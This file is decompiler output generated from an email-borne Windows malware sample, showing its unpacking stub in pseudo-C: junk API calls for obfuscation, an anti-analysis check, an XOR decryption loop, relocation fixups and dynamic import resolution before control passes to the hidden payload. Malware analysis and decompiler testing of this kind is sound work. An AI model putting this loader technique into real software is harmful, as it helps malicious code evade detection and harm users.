// subject.c
// Generated on 5/4/2015 12:23:19 AM by decompiling malware_via_email/malware_0106/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn00401000(word32 ecx, word32 ebx)
{
fn00401000_entry:
l00401000:
	word32 edi_385 = AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + 0x00000025 + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000)
	word32 ebp_16 = 0x00000000
	branch AreAnyAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) != 0x00000000 l0040111F
l0040111C:
	edi_385 = edi_385 - 0x00000022
l0040111F:
	word32 eax_394 = 0x00000000
l00401121:
	branch ebp_16 != edi_385 l00401127
l00401125:
	ebp_16 = 0x00000000
l00401127:
	byte v14_416 = Mem0[eax_394 + 0x00401290:byte] ^ Mem0[ebp_16 + 0x00404000:byte]
	Mem417[eax_394 + 0x00401290:byte] = v14_416
	eax_394 = eax_394 + 0x00000001
	ebp_16 = ebp_16 + 0x00000001
	branch eax_394 <u 0x00001420 l00401121
l00401146:
	word32 edx_425 = 0x00402570
	word32 dwLoc08_430 = 0x00000000
l00401167:
	word32 eax_437 = Mem417[edx_425 + 0x00000004:word32]
	word32 ecx_443 = edx_425 + 0x00000008
	branch eax_437 - 0x00000008 >>u 0x00000001 <= 0x00000000 l004011A9
l00401176:
	word32 esi_615 = eax_437 - 0x00000008 >>u 0x00000001
l00401180:
	branch (Mem417[ecx_443 + 0x00000000:word16] & 0xF000) != 0x3000 l004011A1
l00401190:
	word32 eax_636 = ((word32) Mem417[ecx_443 + 0x00000000:word16] & 0x00000FFF) + Mem417[edx_425 + 0x00000000:word32]
	Mem640[eax_636 + 0x00401010:word32] = Mem417[eax_636 + 0x00401010:word32] + 0xF0401010
l004011A1:
	ecx_443 = ecx_443 + 0x00000002
	esi_615 = esi_615 - 0x00000001
	branch esi_615 != 0x00000000 l00401180
l004011A9:
	word32 eax_450 = Mem417[edx_425 + 0x00000004:word32]
	word32 ecx_452 = dwLoc08_430 + eax_450
	word32 edx_453 = edx_425 + eax_450
	branch ecx_452 <u 0x000000E4 l00401167
	word32 eax_457 = Mem417[edx_453 + 0x00000004:word32]
	word32 ecx_459 = ecx_452 + eax_457
	edx_425 = edx_453 + eax_457
	dwLoc08_430 = ecx_459
	branch ecx_459 <u 0x000000E4 l00401167
l004011C0:
	branch Mem417[0x00401D7C:word32] == 0x00000000 l0040124A
	word32 ebx_469 = 0x00401D6C
	word32 dwLoc04_470 = 0x00401D6C
	ebx_498 = ebx_469
	branch Mem417[0x00401D7C:word32] == 0x00000000 l0040124A
l004011D3:
	word32 ebx_498
	word32 eax_503 = LoadLibraryA(Mem417[ebx_498 + 0x0000000C:word32] + 0x00401010)
	CloseHandle(0x00000062)
	branch eax_503 == 0x00000000 l0040123D
	word32 eax_518 = LoadLibraryA(Mem417[ebx_498 + 0x0000000C:word32] + 0x00401010)
	CloseHandle(0x00000062)
	branch eax_518 == 0x00000000 l0040123D
l004011F1:
	branch Mem417[ebx_498 + 0x00000000:word32] != 0x00000000 l004011FA
	word32 edi_550 = Mem417[ebx_498 + 0x00000000:word32]
	branch edi_550 != 0x00000000 l004011FA
l004011F7:
	edi_550 = Mem417[ebx_498 + 0x00000010:word32]
l004011FA:
	word32 eax_556 = Mem417[edi_550 + 0x00401010:word32]
	word32 edi_558 = edi_550 + 0x00401010
	word32 esi_559 = Mem417[ebx_498 + 0x00000010:word32] + 0x00401010
	byte S_562 = cond(eax_556)
	branch eax_556 == 0x00000000 l0040123D
l00401208:
	word32 dwLoc1C_585
	word32 dwLoc20_581
	branch S_562 l00401215
l0040120A:
	dwLoc1C_585 = (word32) Mem417[edi_558 + 0x00000000:word16]
	dwLoc20_581 = eax_518
	goto l00401222
l00401215:
	dwLoc1C_585 = eax_556 + 0x00401012
	dwLoc20_581 = eax_518
l00401222:
	Mem588[esi_559 + 0x00000000:word32] = GetProcAddress(dwLoc20_581, dwLoc1C_585)
	edi_558 = edi_558 + 0x00000004
	eax_556 = Mem588[edi_558 + 0x00000000:word32]
	esi_559 = esi_559 + 0x00000004
	S_562 = cond(eax_556) (alias)
	branch eax_556 != 0x00000000 l00401208
l00401239:
	ebx_498 = dwLoc04_470
l0040123D:
	ebx_498 = ebx_498 + 0x00000014
	dwLoc04_470 = ebx_498
	branch Mem417[ebx_498 + 0x00000010:word32] != 0x00000000 l004011D3
l0040124A:
	call 0x00401A60 (retsize: 4; depth: 28)
	ExitProcess(0x00000000)
	int3()
fn00401000_exit:
}

